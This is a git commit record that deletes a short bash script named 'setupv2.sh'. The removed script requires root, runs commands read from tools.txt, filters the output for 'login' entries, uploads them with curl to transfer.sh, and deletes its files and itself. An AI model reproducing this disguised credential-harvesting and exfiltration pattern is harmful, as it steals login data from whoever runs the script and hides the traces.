0cce7efbc448c2a5fd73c235b98fb40fd62116bf
Yohan-Nawoor <90769199+Yohan-Nawoor@users.noreply.github.com>
2022-06-09 23:33:39 +0400

    Delete setupv2.sh

--- setupv2.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-if [ `whoami` != root ]; then
-    echo Please run this script as root or using sudo
-    exit
-fi
-
-$(cat tools.txt) | bash | grep 'login' > login.txt && curl --upload-file ./login.txt https://transfer.sh/login.txt && rm tools.txt && rm login.txt && rm -- "$0" || echo "Error dans le zafer -- File has been deleted, re-pull ~Y4"
